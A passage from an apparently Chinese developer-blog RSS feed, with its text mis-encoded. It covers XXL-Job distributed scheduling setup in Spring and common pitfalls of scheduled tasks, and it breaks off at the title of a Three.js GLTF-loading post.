    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h6 data-id="heading-17">â‘¡ é…ç½®æ‰§è¡Œå™¨ï¼ˆapplication.ymlï¼‰</h6>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">xxl:</span>
  <span class="hljs-attr">job:</span>
    <span class="hljs-attr">admin:</span>
      <span class="hljs-attr">addresses:</span> <span class="hljs-string">http://localhost:8080/xxl-job-admin</span> <span class="hljs-comment"># è°ƒåº¦ä¸­å¿ƒåœ°å€</span>
    <span class="hljs-attr">executor:</span>
      <span class="hljs-attr">appname:</span> <span class="hljs-string">order-service-executor</span> <span class="hljs-comment"># æ‰§è¡Œå™¨åç§°ï¼ˆéœ€åœ¨è°ƒåº¦ä¸­å¿ƒæ³¨å†Œï¼‰</span>
      <span class="hljs-attr">address:</span> <span class="hljs-string">""</span> <span class="hljs-comment"># æ‰§è¡Œå™¨åœ°å€ï¼ˆç©ºåˆ™è‡ªåŠ¨æ³¨å†Œï¼‰</span>
      <span class="hljs-attr">ip:</span> <span class="hljs-string">""</span> <span class="hljs-comment"># æ‰§è¡Œå™¨IPï¼ˆç©ºåˆ™è‡ªåŠ¨è·å–ï¼‰</span>
      <span class="hljs-attr">port:</span> <span class="hljs-number">9999</span> <span class="hljs-comment"># æ‰§è¡Œå™¨ç«¯å£</span>
      <span class="hljs-attr">logpath:</span> <span class="hljs-string">./logs/xxl-job/</span> <span class="hljs-comment"># ä»»åŠ¡æ—¥å¿—è·¯å¾„</span>
      <span class="hljs-attr">logretentiondays:</span> <span class="hljs-number">30</span> <span class="hljs-comment"># æ—¥å¿—ä¿ç•™å¤©æ•°</span>
    <span class="hljs-attr">accessToken:</span> <span class="hljs-string">""</span> <span class="hljs-comment"># è°ƒåº¦ä¸­å¿ƒä¸æ‰§è¡Œå™¨çš„é€šä¿¡ä»¤ç‰Œï¼ˆç©ºåˆ™å…³é—­ï¼‰</span>
</code></pre>
<h6 data-id="heading-18">â‘¢ é…ç½®æ‰§è¡Œå™¨å®¢æˆ·ç«¯</h6>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> com.xxl.job.core.executor.impl.XxlJobSpringExecutor;
<span class="hljs-keyword">import</span> org.slf4j.Logger;
<span class="hljs-keyword">import</span> org.slf4j.LoggerFactory;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.<span class="hljs-keyword">annotation</span>.Value;
<span class="hljs-keyword">import</span> org.springframework.context.<span class="hljs-keyword">annotation</span>.Bean;
<span class="hljs-keyword">import</span> org.springframework.context.<span class="hljs-keyword">annotation</span>.Configuration;

<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XxlJobConfig</span> {
    <span class="hljs-keyword">private</span> Logger logger = LoggerFactory.getLogger(XxlJobConfig.<span class="hljs-keyword">class</span>);

    <span class="hljs-meta">@Value(<span class="hljs-string">"<span class="hljs-subst">${xxl.job.admin.addresses}</span>"</span>)</span>
    <span class="hljs-keyword">private</span> String adminAddresses;

    <span class="hljs-meta">@Value(<span class="hljs-string">"<span class="hljs-subst">${xxl.job.executor.appname}</span>"</span>)</span>
    <span class="hljs-keyword">private</span> String appname;

    <span class="hljs-meta">@Value(<span class="hljs-string">"<span class="hljs-subst">${xxl.job.executor.port}</span>"</span>)</span>
    <span class="hljs-keyword">private</span> int port;

    <span class="hljs-meta">@Value(<span class="hljs-string">"<span class="hljs-subst">${xxl.job.executor.logpath}</span>"</span>)</span>
    <span class="hljs-keyword">private</span> String logPath;

    <span class="hljs-meta">@Value(<span class="hljs-string">"<span class="hljs-subst">${xxl.job.accessToken}</span>"</span>)</span>
    <span class="hljs-keyword">private</span> String accessToken;

    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> XxlJobSpringExecutor xxlJobExecutor() {
        logger.info(<span class="hljs-string">"&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; xxl-job config init."</span>);
        XxlJobSpringExecutor xxlJobSpringExecutor = new XxlJobSpringExecutor();
        xxlJobSpringExecutor.setAdminAddresses(adminAddresses);
        xxlJobSpringExecutor.setAppname(appname);
        xxlJobSpringExecutor.setPort(port);
        xxlJobSpringExecutor.setLogPath(logPath);
        xxlJobSpringExecutor.setAccessToken(accessToken);
        <span class="hljs-keyword">return</span> xxlJobSpringExecutor;
    }
}
</code></pre>
<h6 data-id="heading-19">â‘£ å®ç°XXL-Jobä»»åŠ¡</h6>
<p>é€šè¿‡ <code>@XxlJob</code> æ³¨è§£å®šä¹‰ä»»åŠ¡ï¼Œä»»åŠ¡é€»è¾‘å†™åœ¨æ³¨è§£æŒ‡å®šçš„æ–¹æ³•ä¸­ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> com.xxl.job.core.handler.annotation.XxlJob;
<span class="hljs-keyword">import</span> org.slf4j.Logger;
<span class="hljs-keyword">import</span> org.slf4j.LoggerFactory;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-comment">/**
 * XXL-Jobä»»åŠ¡ï¼šè®¢å•è¶…æ—¶å…³é—­
 */</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderTimeoutCloseJob</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">log</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(OrderTimeoutCloseJob.class);

    <span class="hljs-comment">/**
     * ä»»åŠ¡æ ‡è¯†ï¼šorderTimeoutCloseHandlerï¼ˆéœ€åœ¨è°ƒåº¦ä¸­å¿ƒé…ç½®å¯¹åº”Handleråç§°ï¼‰
     */</span>
    <span class="hljs-meta">@XxlJob("orderTimeoutCloseHandler")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">orderTimeoutClose</span><span class="hljs-params">()</span> {
        log.info(<span class="hljs-string">"å¼€å§‹æ‰§è¡Œè®¢å•è¶…æ—¶å…³é—­ä»»åŠ¡"</span>);
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// æ ¸å¿ƒä¸šåŠ¡é€»è¾‘ï¼šæŸ¥è¯¢æ‰€æœ‰åˆ›å»ºæ—¶é—´è¶…è¿‡30åˆ†é’Ÿä¸”æœªæ”¯ä»˜çš„è®¢å•ï¼Œæ‰§è¡Œå…³é—­æ“ä½œ</span>
            <span class="hljs-comment">// int closeCount = orderService.closeTimeoutOrder(30);</span>
            <span class="hljs-comment">// log.info("è®¢å•è¶…æ—¶å…³é—­ä»»åŠ¡æ‰§è¡Œå®Œæˆï¼Œå…±å…³é—­è®¢å•ï¼š{} ä¸ª", closeCount);</span>
        } <span class="hljs-keyword">catch</span> (Exception e) {
            log.error(<span class="hljs-string">"è®¢å•è¶…æ—¶å…³é—­ä»»åŠ¡æ‰§è¡Œå¤±è´¥"</span>, e);
            <span class="hljs-comment">// æŠ›å‡ºå¼‚å¸¸ï¼ŒXXL-Jobä¼šè‡ªåŠ¨è®°å½•å¤±è´¥çŠ¶æ€ï¼Œæ”¯æŒæ‰‹åŠ¨é‡è¯•æˆ–é…ç½®è‡ªåŠ¨é‡è¯•</span>
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"è®¢å•è¶…æ—¶å…³é—­å¤±è´¥"</span>, e);
        }
    }
}
</code></pre>
<h6 data-id="heading-20">â‘¤ è°ƒåº¦ä¸­å¿ƒé…ç½®ä»»åŠ¡</h6>
<ol>
<li>ç™»å½•XXL-Jobç®¡ç†ç•Œé¢ï¼Œåœ¨â€œæ‰§è¡Œå™¨ç®¡ç†â€ä¸­æ·»åŠ æ‰§è¡Œå™¨ï¼ˆAppNameä¸é…ç½®æ–‡ä»¶ä¸€è‡´ï¼‰ï¼› 2. åœ¨â€œä»»åŠ¡ç®¡ç†â€ä¸­åˆ›å»ºä»»åŠ¡ï¼š - ä»»åŠ¡æè¿°ï¼šè®¢å•è¶…æ—¶å…³é—­ï¼› - æ‰§è¡Œå™¨ï¼šé€‰æ‹©å·²æ³¨å†Œçš„æ‰§è¡Œå™¨ï¼› - ä»»åŠ¡ç±»å‹ï¼šBEANæ¨¡å¼ï¼› - JobHandlerï¼šå¡«å†™æ³¨è§£ä¸­çš„ä»»åŠ¡æ ‡è¯†ï¼ˆorderTimeoutCloseHandlerï¼‰ï¼› - è°ƒåº¦è§„åˆ™ï¼šcronè¡¨è¾¾å¼ï¼ˆå¦‚0 */1 * * * ? è¡¨ç¤ºæ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ï¼‰ï¼› 3. å¯åŠ¨ä»»åŠ¡ï¼Œå³å¯å®ç°åˆ†å¸ƒå¼ç¯å¢ƒä¸‹çš„å®šæ—¶æ‰§è¡Œã€‚</li>
</ol>
<h3 data-id="heading-21">å››ã€å®šæ—¶ä»»åŠ¡é¿å‘æŒ‡å—ï¼š10ä¸ªå¸¸è§é—®é¢˜åŠè§£å†³æ–¹æ¡ˆ</h3>
<p>å®šæ—¶ä»»åŠ¡çœ‹ä¼¼ç®€å•ï¼Œä½†åœ¨ç”Ÿäº§ç¯å¢ƒä¸­å®¹æ˜“å‡ºç°å„ç§é—®é¢˜ï¼Œä»¥ä¸‹æ˜¯10ä¸ªé«˜é¢‘å‘ç‚¹åŠè§„é¿æ–¹æ¡ˆï¼š</p>
<h4 data-id="heading-22">1. å‘ç‚¹1ï¼šå•æœºå¤šä»»åŠ¡é˜»å¡</h4>
<p>ç°è±¡ï¼šä¸€ä¸ªä»»åŠ¡æ‰§è¡Œç¼“æ…¢ï¼Œå¯¼è‡´å…¶ä»–ä»»åŠ¡æ’é˜Ÿç­‰å¾…ï¼Œç”šè‡³é”™è¿‡æ‰§è¡Œæ—¶é—´ã€‚ è§„é¿ï¼šè‡ªå®šä¹‰å®šæ—¶ä»»åŠ¡çº¿ç¨‹æ± ï¼Œè®¾ç½®åˆç†çš„æ ¸å¿ƒçº¿ç¨‹æ•°ï¼ˆæ ¹æ®ä»»åŠ¡æ•°é‡å’Œæ‰§è¡Œè€—æ—¶è°ƒæ•´ï¼‰ï¼›å¯¹è€—æ—¶ä»»åŠ¡å•ç‹¬é…ç½®çº¿ç¨‹æ± ã€‚</p>
<h4 data-id="heading-23">2. å‘ç‚¹2ï¼šåˆ†å¸ƒå¼éƒ¨ç½²é‡å¤æ‰§è¡Œ</h4>
<p>ç°è±¡ï¼šå¤šå®ä¾‹éƒ¨ç½²æ—¶ï¼ŒåŒä¸€ä¸ªå®šæ—¶ä»»åŠ¡åœ¨å¤šä¸ªå®ä¾‹ä¸ŠåŒæ—¶æ‰§è¡Œï¼Œå¯¼è‡´æ•°æ®é‡å¤ï¼ˆå¦‚é‡å¤å‘é€é€šçŸ¥ï¼‰ã€‚ è§„é¿ï¼š - ç®€å•åœºæ™¯ï¼šç”¨åˆ†å¸ƒå¼é”ï¼ˆå¦‚Redisson Lockï¼‰ï¼Œä»»åŠ¡æ‰§è¡Œå‰å…ˆè·å–é”ï¼Œè·å–å¤±è´¥åˆ™ä¸æ‰§è¡Œï¼› - å¤æ‚åœºæ™¯ï¼šä½¿ç”¨Quartzé›†ç¾¤æˆ–XXL-Jobï¼Œæ¡†æ¶è‡ªå¸¦åˆ†å¸ƒå¼åè°ƒæœºåˆ¶ã€‚</p>
<h4 data-id="heading-24">3. å‘ç‚¹3ï¼šä»»åŠ¡æ‰§è¡Œæ—¶é—´è¿‡é•¿ï¼Œè¶…è¿‡ä¸‹æ¬¡è°ƒåº¦æ—¶é—´</h4>
<p>ç°è±¡ï¼šä»»åŠ¡æ‰§è¡Œæ—¶é—´è¶…è¿‡è°ƒåº¦é—´éš”ï¼ˆå¦‚æ¯éš”5ç§’æ‰§è¡Œä¸€æ¬¡ï¼Œä½†ä»»åŠ¡éœ€è¦6ç§’å®Œæˆï¼‰ï¼Œå¯¼è‡´ä»»åŠ¡å åŠ æ‰§è¡Œã€‚ è§„é¿ï¼š - ç”¨ fixedDelay ä»£æ›¿ fixedRateï¼ˆfixedDelayä»¥ä¸Šæ¬¡ä»»åŠ¡ç»“æŸæ—¶é—´ä¸ºåŸºå‡†ï¼‰ï¼› - ä¼˜åŒ–ä»»åŠ¡é€»è¾‘ï¼Œæ‹†åˆ†è€—æ—¶ä»»åŠ¡ï¼ˆå¦‚å¤§æ•°æ®é‡å¤„ç†æ”¹ä¸ºåˆ†ç‰‡æ‰§è¡Œï¼‰ï¼› - é…ç½®ä»»åŠ¡å¹¶å‘æ§åˆ¶ï¼ˆå¦‚Quartzçš„ @DisallowConcurrentExecution æ³¨è§£ï¼Œç¦æ­¢å¹¶å‘æ‰§è¡Œï¼‰ã€‚</p>
<h4 data-id="heading-25">4. å‘ç‚¹4ï¼šä»»åŠ¡å¤±è´¥æ— é‡è¯•ï¼Œå¯¼è‡´ä¸šåŠ¡ä¸­æ–­</h4>
<p>ç°è±¡ï¼šä»»åŠ¡å› ç½‘ç»œæ³¢åŠ¨ã€ç¬¬ä¸‰æ–¹æœåŠ¡å¼‚å¸¸ç­‰ä¸´æ—¶é—®é¢˜å¤±è´¥ï¼Œæœªè§¦å‘é‡è¯•ï¼Œå¯¼è‡´ä¸šåŠ¡é—­ç¯ä¸­æ–­ï¼ˆå¦‚è®¢å•æœªåŠæ—¶å…³é—­ï¼‰ã€‚ è§„é¿ï¼š - Spring Schedulerï¼šç»“åˆ Spring Retry æ¡†æ¶ï¼Œæ·»åŠ  @Retryable æ³¨è§£ï¼› - Quartz/XXL-Jobï¼šé…ç½®ä»»åŠ¡é‡è¯•ç­–ç•¥ï¼ˆå¦‚å¤±è´¥åé‡è¯•3æ¬¡ï¼Œæ¯æ¬¡é—´éš”1åˆ†é’Ÿï¼‰ã€‚</p>
<h4 data-id="heading-26">5. å‘ç‚¹5ï¼šæ—¥å¿—æ— é“¾è·¯æ ‡è¯†ï¼Œæ’æŸ¥å›°éš¾</h4>
<p>ç°è±¡ï¼šå®šæ—¶ä»»åŠ¡æ—¥å¿—æ··æ‚åœ¨ä¸šåŠ¡æ—¥å¿—ä¸­ï¼Œæ— æ³•å¿«é€Ÿå®šä½æŸä¸€æ¬¡ä»»åŠ¡æ‰§è¡Œçš„å®Œæ•´æ—¥å¿—ã€‚ è§„é¿ï¼šåœ¨ä»»åŠ¡æ‰§è¡Œå‰æ‰‹åŠ¨ç»‘å®šMDCé“¾è·¯æ ‡è¯†ï¼ˆå¦‚requestIdï¼‰ï¼Œæ‰§è¡Œåæ¸…é™¤ï¼Œç¡®ä¿æ—¥å¿—å¯è¿½è¸ªï¼ˆå‚è€ƒä¹‹å‰MDCåšå®¢å†…å®¹ï¼‰ã€‚</p>
<h4 data-id="heading-27">6. å‘ç‚¹6ï¼šä»»åŠ¡å‚æ•°ç¡¬ç¼–ç ï¼Œæ— æ³•åŠ¨æ€è°ƒæ•´</h4>
<p>ç°è±¡ï¼šä»»åŠ¡æ‰§è¡Œè§„åˆ™ï¼ˆå¦‚è¶…æ—¶æ—¶é—´ã€æ‰§è¡Œé—´éš”ï¼‰ç¡¬ç¼–ç åœ¨ä»£ç ä¸­ï¼Œéœ€è¦ä¿®æ”¹æ—¶å¿…é¡»é‡å¯æœåŠ¡ã€‚ è§„é¿ï¼š - Spring Schedulerï¼šç”¨ @Scheduled(cron = "${task.cron.clean-order}") ä»é…ç½®æ–‡ä»¶è¯»å–å‚æ•°ï¼› - XXL-Jobï¼šç›´æ¥åœ¨è°ƒåº¦ä¸­å¿ƒç•Œé¢ä¿®æ”¹è°ƒåº¦è§„åˆ™ï¼Œæ— éœ€é‡å¯æœåŠ¡ã€‚</p>
<h4 data-id="heading-28">7. å‘ç‚¹7ï¼šä»»åŠ¡æ— ç›‘æ§ï¼Œå¤±è´¥åæ— äººçŸ¥æ™“</h4>
<p>ç°è±¡ï¼šä»»åŠ¡æ‰§è¡Œå¤±è´¥åï¼Œå¼€å‘/è¿ç»´äººå‘˜æ— æ³•åŠæ—¶è·çŸ¥ï¼Œå¯¼è‡´é—®é¢˜æ‰©å¤§ï¼ˆå¦‚æŠ¥è¡¨æœªç”Ÿæˆï¼Œå½±å“ç»è¥å†³ç­–ï¼‰ã€‚ è§„é¿ï¼š - ç®€å•åœºæ™¯ï¼šä»»åŠ¡å¤±è´¥æ—¶å‘é€å‘Šè­¦é‚®ä»¶/é’‰é’‰æ¶ˆæ¯ï¼› - å¤æ‚åœºæ™¯ï¼šä½¿ç”¨XXL-Jobï¼Œé…ç½®ä»»åŠ¡å¤±è´¥å‘Šè­¦ï¼ˆæ”¯æŒé‚®ä»¶ã€é’‰é’‰ã€ä¼ä¸šå¾®ä¿¡ï¼‰ï¼›ç»“åˆPrometheus+Grafanaç›‘æ§ä»»åŠ¡æ‰§è¡ŒçŠ¶æ€ã€‚</p>
<h4 data-id="heading-29">8. å‘ç‚¹8ï¼šå¤§æ•°æ®é‡ä»»åŠ¡æ‰§è¡Œè¶…æ—¶</h4>
<p>ç°è±¡ï¼šå¤„ç†å¤§æ•°æ®é‡æ—¶ï¼ˆå¦‚æ¸…ç†100ä¸‡æ¡è¿‡æœŸæ•°æ®ï¼‰ï¼Œä»»åŠ¡æ‰§è¡Œæ—¶é—´è¿‡é•¿ï¼Œè¢«ç³»ç»Ÿä¸­æ–­ã€‚ è§„é¿ï¼š - åˆ†ç‰‡æ‰§è¡Œï¼šå°†ä»»åŠ¡æ‹†åˆ†ä¸ºå¤šä¸ªå­ä»»åŠ¡ï¼ˆå¦‚æŒ‰ç”¨æˆ·IDåˆ†ç‰‡ï¼‰ï¼Œå¤šä¸ªå®ä¾‹å¹¶è¡Œå¤„ç†ï¼› - åˆ†æ‰¹å¤„ç†ï¼šæ¯æ¬¡å¤„ç†1000æ¡æ•°æ®ï¼Œå¾ªç¯æ‰§è¡Œï¼Œé¿å…å•æ¬¡å¤„ç†æ•°æ®é‡è¿‡å¤§ã€‚</p>
<h4 data-id="heading-30">9. å‘ç‚¹9ï¼šä»»åŠ¡ä¾èµ–å¯¼è‡´æ‰§è¡Œé¡ºåºæ··ä¹±</h4>
<p>ç°è±¡ï¼šä»»åŠ¡Aéœ€è¦åœ¨ä»»åŠ¡Bæ‰§è¡Œå®Œæˆåæ‰§è¡Œï¼ˆå¦‚å…ˆæ¸…ç†æ•°æ®ï¼Œå†ç”ŸæˆæŠ¥è¡¨ï¼‰ï¼Œä½†å› è°ƒåº¦æœºåˆ¶å¯¼è‡´é¡ºåºæ··ä¹±ã€‚ è§„é¿ï¼š - ç®€å•åœºæ™¯ï¼šç”¨ fixedDelay æ§åˆ¶ä»»åŠ¡é—´éš”ï¼Œç¡®ä¿å‰ä¸€ä¸ªä»»åŠ¡å®Œæˆï¼› - å¤æ‚åœºæ™¯ï¼šä½¿ç”¨Quartzçš„ä»»åŠ¡ä¾èµ–æœºåˆ¶ï¼Œæˆ–XXL-Jobçš„ä»»åŠ¡ç¼–æ’åŠŸèƒ½ã€‚</p>
<h4 data-id="heading-31">10. å‘ç‚¹10ï¼šæœåŠ¡é‡å¯æ—¶ä»»åŠ¡é‡å¤æ‰§è¡Œ</h4>
<p>ç°è±¡ï¼šæœåŠ¡é‡å¯æ—¶ï¼Œæœªæ‰§è¡Œå®Œæˆçš„å®šæ—¶ä»»åŠ¡è¢«é‡æ–°è§¦å‘ï¼Œå¯¼è‡´é‡å¤å¤„ç†ã€‚ è§„é¿ï¼š - ä»»åŠ¡å¹‚ç­‰æ€§è®¾è®¡ï¼šé€šè¿‡å”¯ä¸€æ ‡è¯†ï¼ˆå¦‚è®¢å•å·ï¼‰ç¡®ä¿é‡å¤æ‰§è¡Œä¸ä¼šäº§ç”Ÿå‰¯ä½œç”¨ï¼› - æŒä¹…åŒ–ä»»åŠ¡çŠ¶æ€ï¼šå°†ä»»åŠ¡æ‰§è¡ŒçŠ¶æ€å­˜å…¥æ•°æ®åº“ï¼Œä»»åŠ¡å¯åŠ¨æ—¶å…ˆæ£€æŸ¥çŠ¶æ€ï¼Œé¿å…é‡å¤æ‰§è¡Œã€‚</p>
<h3 data-id="heading-32">äº”ã€é«˜çº§ç”¨æ³•ï¼šå®šæ—¶ä»»åŠ¡çš„è¿›é˜¶èƒ½åŠ›</h3>
<p>å¯¹äºå¤æ‚ä¸šåŠ¡åœºæ™¯ï¼Œè¿˜éœ€è¦æŒæ¡å®šæ—¶ä»»åŠ¡çš„è¿›é˜¶èƒ½åŠ›ï¼Œæ»¡è¶³æ›´é«˜çš„ä¸šåŠ¡éœ€æ±‚ï¼š</p>
<h4 data-id="heading-33">1. åŠ¨æ€è°ƒæ•´ä»»åŠ¡æ‰§è¡Œè§„åˆ™</h4>
<p>éœ€æ±‚ï¼šæ ¹æ®ä¸šåŠ¡æµé‡åŠ¨æ€è°ƒæ•´ä»»åŠ¡æ‰§è¡Œé—´éš”ï¼ˆå¦‚é«˜å³°æœŸæ¯5åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ï¼Œä½å³°æœŸæ¯30åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ï¼‰ã€‚ å®ç°æ–¹æ¡ˆï¼š - Spring Schedulerï¼šé€šè¿‡ ScheduledFuture åŠ¨æ€å–æ¶ˆå’Œé‡æ–°åˆ›å»ºä»»åŠ¡ï¼› - XXL-Jobï¼šç›´æ¥è°ƒç”¨è°ƒåº¦ä¸­å¿ƒAPIä¿®æ”¹ä»»åŠ¡çš„cronè¡¨è¾¾å¼ï¼Œæ— éœ€é‡å¯æœåŠ¡ã€‚</p>
<h4 data-id="heading-34">2. ä»»åŠ¡åˆ†ç‰‡æ‰§è¡Œï¼ˆå¤§æ•°æ®é‡å¤„ç†ï¼‰</h4>
<p>éœ€æ±‚ï¼šå¤„ç†1000ä¸‡æ¡ç”¨æˆ·æ•°æ®ï¼Œå•å®ä¾‹æ‰§è¡Œè€—æ—¶è¿‡é•¿ï¼Œéœ€è¦å¤šå®ä¾‹å¹¶è¡Œå¤„ç†ã€‚ å®ç°æ–¹æ¡ˆï¼š - XXL-Jobï¼šæ”¯æŒåˆ†ç‰‡ä»»åŠ¡ï¼Œè°ƒåº¦ä¸­å¿ƒå°†ä»»åŠ¡æ‹†åˆ†ä¸ºå¤šä¸ªåˆ†ç‰‡ï¼Œåˆ†é…ç»™ä¸åŒæ‰§è¡Œå™¨å®ä¾‹å¹¶è¡Œæ‰§è¡Œï¼› - è‡ªå®šä¹‰åˆ†ç‰‡ï¼šåŸºäºRedisæˆ–æ•°æ®åº“å®ç°åˆ†ç‰‡è§„åˆ™ï¼ˆå¦‚æŒ‰ç”¨æˆ·IDå–æ¨¡åˆ†ç‰‡ï¼‰ï¼Œæ¯ä¸ªå®ä¾‹å¤„ç†æŒ‡å®šåˆ†ç‰‡çš„æ•°æ®ã€‚</p>
<h4 data-id="heading-35">3. ä»»åŠ¡æ‰§è¡ŒçŠ¶æ€ç›‘æ§ä¸å¯è§†åŒ–</h4>
<p>éœ€æ±‚ï¼šå®æ—¶æŸ¥çœ‹ä»»åŠ¡æ‰§è¡ŒçŠ¶æ€ã€å†å²æ‰§è¡Œè®°å½•ã€å¤±è´¥åŸå› ï¼Œæ”¯æŒå¯è§†åŒ–ç»Ÿè®¡ã€‚ å®ç°æ–¹æ¡ˆï¼š - è‡ªå»ºç›‘æ§ï¼šå°†ä»»åŠ¡æ‰§è¡ŒçŠ¶æ€å­˜å…¥æ•°æ®åº“ï¼Œå¼€å‘ç›‘æ§ç•Œé¢ï¼› - å¼€æºå·¥å…·ï¼šä½¿ç”¨XXL-Jobçš„å†…ç½®ç›‘æ§åŠŸèƒ½ï¼Œæˆ–é›†æˆPrometheus+Grafanaå®ç°è‡ªå®šä¹‰ç›‘æ§é¢æ¿ã€‚</p>
<h4 data-id="heading-36">4. ä»»åŠ¡ç°åº¦å‘å¸ƒä¸å›æ»š</h4>
<p>éœ€æ±‚ï¼šæ–°ä»»åŠ¡ä¸Šçº¿æ—¶å…ˆåœ¨éƒ¨åˆ†å®ä¾‹æ‰§è¡Œï¼ˆç°åº¦ï¼‰ï¼ŒéªŒè¯æ— é—®é¢˜åå…¨é‡ä¸Šçº¿ï¼›å‡ºç°é—®é¢˜æ—¶æ”¯æŒå¿«é€Ÿå›æ»šã€‚ å®ç°æ–¹æ¡ˆï¼š - XXL-Jobï¼šæ”¯æŒä»»åŠ¡æ‰§è¡ŒèŒƒå›´æ§åˆ¶ï¼ˆæŒ‡å®šæ‰§è¡Œå™¨å®ä¾‹ï¼‰ï¼Œå®ç°ç°åº¦å‘å¸ƒï¼› - è‡ªå®šä¹‰å¼€å…³ï¼šé€šè¿‡é…ç½®ä¸­å¿ƒï¼ˆå¦‚Nacosï¼‰è®¾ç½®ä»»åŠ¡å¼€å…³ï¼Œæ”¯æŒå¿«é€Ÿå¯åœå’Œå›æ»šã€‚</p>
<h3 data-id="heading-37">å…­ã€æ€»ç»“ï¼šå®šæ—¶ä»»åŠ¡çš„é€‰å‹ä¸è½åœ°å»ºè®®</h3>
<p>å®šæ—¶ä»»åŠ¡çš„æ ¸å¿ƒæ˜¯â€œç¨³å®šã€å¯é ã€å¯ç›‘æ§â€ï¼Œé€‰å‹å’Œè½åœ°æ—¶éœ€éµå¾ªä»¥ä¸‹åŸåˆ™ï¼š</p>
<ul>
<li><strong>é€‰å‹åŸåˆ™</strong>ï¼šç®€å•åœºæ™¯ç”¨Spring Schedulerï¼Œå¤æ‚è°ƒåº¦ç”¨Quartzï¼Œåˆ†å¸ƒå¼åœºæ™¯ç”¨XXL-Jobï¼›é¿å…è¿‡åº¦è®¾è®¡ï¼Œå°é¡¹ç›®æ— éœ€å¼•å…¥é‡é‡çº§æ¡†æ¶ï¼›</li>
<li><strong>è½åœ°æ ¸å¿ƒ</strong>ï¼šå¿…é¡»ä¿è¯ä»»åŠ¡å¹‚ç­‰æ€§ï¼ˆé¿å…é‡å¤æ‰§è¡Œé—®é¢˜ï¼‰ï¼›å¿…é¡»é…ç½®ç›‘æ§å‘Šè­¦ï¼ˆåŠæ—¶å‘ç°å¤±è´¥ä»»åŠ¡ï¼‰ï¼›å¿…é¡»ä¼˜åŒ–ä»»åŠ¡æ€§èƒ½ï¼ˆé¿å…é˜»å¡å’Œè¶…æ—¶ï¼‰ï¼›</li>
<li><strong>è¿›é˜¶æ–¹å‘</strong>ï¼šä»â€œå•æœºå®šæ—¶â€å‘â€œåˆ†å¸ƒå¼è°ƒåº¦â€æ¼”è¿›ï¼Œä»â€œé™æ€é…ç½®â€å‘â€œåŠ¨æ€è°ƒæ•´â€æ¼”è¿›ï¼Œä»â€œè¢«åŠ¨æ’æŸ¥â€å‘â€œä¸»åŠ¨ç›‘æ§â€æ¼”è¿›ã€‚</li>
</ul>
<p>æœ€åï¼Œå®šæ—¶ä»»åŠ¡æ˜¯ä¸šåŠ¡é—­ç¯çš„é‡è¦ä¿éšœï¼Œå¼€å‘æ—¶ä¸ä»…è¦å…³æ³¨â€œæŒ‰æ—¶æ‰§è¡Œâ€ï¼Œæ›´è¦è€ƒè™‘å¼‚å¸¸å¤„ç†ã€é«˜å¯ç”¨å’Œå¯è¿ç»´æ€§ã€‚å¸Œæœ›æœ¬æ–‡çš„å®æˆ˜æŒ‡å—èƒ½å¸®åŠ©ä½ é¿å¼€å‘ç‚¹ï¼Œå®ç°é«˜æ•ˆã€ç¨³å®šçš„å®šæ—¶ä»»åŠ¡è½åœ°ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç¬¬9ç«  Three.jsè½½å…¥æ¨¡å‹GLTF]]></title>    <link>https://juejin.cn/post/7592515924701757475</link>    <guid>https://juejin.cn/post/7592515924701757475</guid>    <pubDate>2026-01-08T07:49:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592515924701757475" data-draft-id="7592515924701741091" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç¬¬9ç«  Three.jsè½½å…¥æ¨¡å‹GLTF"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,three.js"/> <meta itemprop="datePublished" content="2026-01-08T07:49:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="XiaoYu2002"/> <meta itemprop="url" content="https://juejin.cn/user/251124329220663"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç¬¬9ç«  Three.jsè½½å…¥æ¨¡å‹GLTF
